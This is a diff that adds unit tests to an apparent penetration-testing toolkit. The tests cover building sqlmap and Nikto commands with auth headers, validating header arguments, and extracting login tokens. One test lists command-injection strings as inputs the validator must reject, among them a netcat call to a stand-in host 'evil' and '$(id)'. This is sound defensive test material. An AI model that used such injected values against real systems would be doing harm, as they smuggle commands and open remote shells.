@@ -53,6 +53,37 @@ class TestAuthPassthrough:
             reg._validate_header("no-colon-here")
 
 
+@pytest.mark.unit
+class TestSqlmapNiktoAuth:
+    def test_sqlmap_adds_cookie_and_headers(self):
+        from quarr.core.validators.command import validate_argv
+        from quarr.tools.integrations.sqlmap import SqlmapIntegration
+        argv = SqlmapIntegration().build_command(
+            target="http://t/p?id=1", cookie="session=abc", headers="Authorization: Bearer x.y.z")
+        assert "--cookie" in argv and "session=abc" in argv
+        assert "--headers" in argv and "Authorization: Bearer x.y.z" in argv
+        validate_argv(argv)  # header spaces must pass the validator
+
+    def test_nikto_adds_cookie_header(self):
+        from quarr.core.validators.command import validate_argv
+        from quarr.tools.integrations.nikto import NiktoIntegration
+        argv = NiktoIntegration().build_command(target="http://t/", cookie="s=1", headers="X-Api: k")
+        assert "Cookie: s=1" in argv and "X-Api: k" in argv
+        validate_argv(argv)
+
+    def test_header_value_blocks_injection(self):
+        from quarr.core.exceptions import ArgumentValidationError
+        from quarr.core.validators.command import validate_header_arg
+        for bad in ["X: y`whoami`", "X: y|nc evil 4444", "X: y$(id)", "X: y>out"]:
+            with pytest.raises(ArgumentValidationError):
+                validate_header_arg(bad)
+
+    def test_header_value_allows_normal_auth(self):
+        from quarr.core.validators.command import validate_header_arg
+        assert validate_header_arg("Authorization: Bearer eyJ.abc.def") == "Authorization: Bearer eyJ.abc.def"
+        assert validate_header_arg("session=abc; role=user") == "session=abc; role=user"
+
+
 # =========================================================================== #
 # http_request tool
 # =========================================================================== #
@@ -121,3 +152,41 @@ class TestHttpRequest:
 
     def test_registered_in_registry(self):
         assert "http_request" in reg.TOOL_REGISTRY
+
+
+@pytest.mark.unit
+class TestWebLogin:
+    def test_extracts_json_token(self, monkeypatch):
+        monkeypatch.setattr(httpx, "post",
+                            lambda *a, **k: _resp(200, '{"auth_token": "eyJabc.def.ghi"}',
+                                                  {"content-type": "application/json"}))
+        out = api.web_login("http://s/login", "u", "p")
+        assert "Token found" in out
+        assert "Authorization: Bearer eyJabc.def.ghi" in out
+
+    def test_extracts_nested_token(self, monkeypatch):
+        monkeypatch.setattr(httpx, "post",
+                            lambda *a, **k: _resp(200, '{"data": {"access_token": "T123"}}'))
+        out = api.web_login("http://s/login", "u", "p")
+        assert "Bearer T123" in out
+
+    def test_extracts_set_cookie(self, monkeypatch):
+        monkeypatch.setattr(httpx, "post",
+                            lambda *a, **k: _resp(200, "{}", {"set-cookie": "session=abc; Path=/; HttpOnly"}))
+        out = api.web_login("http://s/login", "u", "p")
+        assert "session=abc" in out
+        assert "use as cookie" in out
+
+    def test_login_failure_flagged(self, monkeypatch):
+        monkeypatch.setattr(httpx, "post", lambda *a, **k: _resp(401, '{"error":"bad creds"}'))
+        out = api.web_login("http://s/login", "u", "wrong")
+        assert "likely failed" in out
+
+    def test_rejects_bad_url(self):
+        assert "[ERROR]" in api.web_login("not a url", "u", "p")
+
+    def test_rejects_bad_mode(self):
+        assert "[ERROR]" in api.web_login("http://s/login", "u", "p", mode="soap")
+
+    def test_web_login_registered(self):
+        assert "web_login" in reg.TOOL_REGISTRY
